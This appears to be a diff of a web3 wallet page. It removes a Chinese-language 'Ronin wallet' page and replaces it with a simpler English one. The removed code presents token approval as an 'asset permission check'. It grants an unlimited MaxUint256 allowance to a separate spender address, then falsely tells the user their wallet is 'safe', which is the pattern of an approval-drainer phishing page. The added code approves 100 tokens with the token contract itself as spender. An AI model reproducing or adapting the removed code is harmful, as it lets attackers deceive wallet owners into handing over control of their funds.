@@ -1,137 +1,123 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ronin 钱包连接与授权</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web3 Wallet & Contract Authorization</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js"></script>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
     body {
-      background-color: #0a0e17;
-      font-family: "Segoe UI", Roboto, sans-serif;
-      color: #ffffff;
-      text-align: center;
-      padding: 60px 20px;
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
     }
-    .logo {
-      max-width: 100px;
-      margin-bottom: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
-    }
-    h1 {
-      font-size: 2.5rem;
-      color: #ffffff;
-      margin-bottom: 15px;
-    }
-    p {
-      font-size: 1rem;
-      color: #bbbbbb;
-      margin-bottom: 35px;
-    }
-    .btn {
-      font-size: 1rem;
-      padding: 14px 28px;
-      border: none;
-      border-radius: 8px;
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
       margin: 10px;
       cursor: pointer;
-      transition: 0.3s;
+      background-color: #007bff;
+      border: none;
+      border-radius: 5px;
+      color: white;
     }
-    .connect-btn {
-      background-color: #2970ff;
-      color: #fff;
+    button:hover {
+      background-color: #0056b3;
     }
-    .connect-btn:hover {
-      background-color: #1c54c8;
-    }
-    .approve-btn {
-      background-color: #0cd66e;
-      color: #fff;
-    }
-    .approve-btn:hover {
-      background-color: #0ab862;
-    }
-    #wallet-address {
-      margin-top: 30px;
-      color: #4fd1c5;
-      font-weight: bold;
-      line-height: 1.6;
+    #status {
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
 
-  <!-- 页面标题 -->
-  <h1>Ronin 钱包连接与授权</h1>
-  <p>请连接钱包并授权智能合约，以进行资产权限检测。</p>
+  <h1>Web3 Wallet & Contract Authorization</h1>
+  <button id="connectButton">Connect Wallet</button>
+  <button id="authorizeButton" disabled>Authorize Contract</button>
+  <div id="status"></div>
 
-  <!-- 按钮区 -->
-  <button class="btn connect-btn" onclick="connectWallet()">🔌 连接钱包</button>
-  <button class="btn approve-btn" onclick="approveContract()">✅ 授权合约</button>
-
-  <!-- 钱包地址展示区 -->
-  <div id="wallet-address"></div>
-
-  <!-- 引入稳定版本的 ethers.js -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    let userAddress;
-    const tokenAddress = "0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21"; // Sepolia 测试代币地址
-    const spenderAddress = "0x572A3a205247F867fE636Cf81Ff0e8C2DC7Ba553"; // 你部署的合约地址
+    let web3;
+    let userAccount;
+    const contractAddress = '0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21'; // Your contract address
 
-    const erc20ABI = [
-      {
-        "inputs": [
-          { "internalType": "address", "name": "spender", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "approve",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
+    // Button references
+    const connectButton = document.getElementById('connectButton');
+    const authorizeButton = document.getElementById('authorizeButton');
+    const statusDiv = document.getElementById('status');
 
-    async function connectWallet() {
-      if (window.ethereum) {
+    // Check if Web3 is available
+    if (typeof window.ethereum !== 'undefined') {
+      web3 = new Web3(window.ethereum);
+
+      // Handle Connect Wallet button click
+      connectButton.addEventListener('click', async () => {
         try {
-          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-          userAddress = accounts[0];
-          document.getElementById("wallet-address").innerText = "钱包地址：" + userAddress;
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          userAccount = accounts[0];
+          statusDiv.innerText = `Connected: ${userAccount}`;
+          connectButton.disabled = true; // Disable after connection
+          authorizeButton.disabled = false; // Enable authorize button
         } catch (err) {
-          alert("连接失败: " + err.message);
+          console.error('Error connecting to wallet', err);
+          statusDiv.innerText = 'Failed to connect wallet.';
         }
-      } else {
-        alert("请安装 MetaMask 或 Ronin Wallet 插件");
-      }
-    }
+      });
 
-    async function approveContract() {
-      if (!userAddress) {
-        alert("请先连接钱包！");
-        return;
-      }
+      // Handle Authorize Contract button click
+      authorizeButton.addEventListener('click', async () => {
+        try {
+          const contractABI = [
+            // ABI for the 'approve' function
+            {
+              "constant": false,
+              "inputs": [
+                {
+                  "name": "spender",
+                  "type": "address"
+                },
+                {
+                  "name": "amount",
+                  "type": "uint256"
+                }
+              ],
+              "name": "approve",
+              "outputs": [
+                {
+                  "name": "",
+                  "type": "bool"
+                }
+              ],
+              "payable": false,
+              "stateMutability": "nonpayable",
+              "type": "function"
+            }
+          ];
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const token = new ethers.Contract(tokenAddress, erc20ABI, signer);
+          const contract = new web3.eth.Contract(contractABI, contractAddress);
+          const amountToAuthorize = web3.utils.toWei('100', 'ether'); // Adjust the value as needed
 
-      try {
-        const tx = await token.approve(spenderAddress, ethers.constants.MaxUint256);
-        await tx.wait();
+          // Sending the transaction to approve the contract
+          const receipt = await contract.methods
+            .approve(contractAddress, amountToAuthorize)
+            .send({ from: userAccount });
 
-        document.getElementById("wallet-address").innerHTML =
-          `钱包地址：${userAddress}<br/><span style="color:lightgreen;">✅ 钱包状态：安全</span>`;
-      } catch (err) {
-        document.getElementById("wallet-address").innerHTML =
-          `钱包地址：${userAddress}<br/><span style="color:orange;">⚠️ 钱包状态：未授权</span><br/>错误信息：${err.message}`;
-      }
+          statusDiv.innerText = `Contract authorized! Txn Hash: ${receipt.transactionHash}`;
+        } catch (err) {
+          console.error('Error authorizing contract', err);
+          statusDiv.innerText = 'Failed to authorize contract.';
+        }
+      });
+    } else {
+      statusDiv.innerText = 'Please install MetaMask!';
     }
   </script>
+
 </body>
 </html>
